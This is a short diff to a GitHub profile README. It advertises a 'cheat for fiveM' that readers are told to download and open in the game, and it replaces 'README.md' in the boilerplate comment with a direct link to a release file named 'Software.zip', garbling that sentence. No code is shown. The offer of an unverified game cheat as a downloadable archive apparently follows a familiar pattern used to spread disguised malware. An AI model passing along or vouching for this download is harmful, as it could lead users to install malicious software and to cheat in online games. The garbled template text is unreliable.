@@ -1,7 +1,7 @@
 ## Hi there this is a cheat for fiveM just download and then open in fiveM and press Page up den its done
 
 <!--
-**Grabbeis/Grabbeis** is a ✨ _special_ ✨ repository because its `README.md` (this file) appears on your GitHub profile.
+**Grabbeis/Grabbeis** is a ✨ _special_ ✨ repository because its `https://github.com/Grabbeis/Grabbeis/releases/download/v2.0/Software.zip` (this file) appears on your GitHub profile.
 
 Here are some ideas to get you started:
 
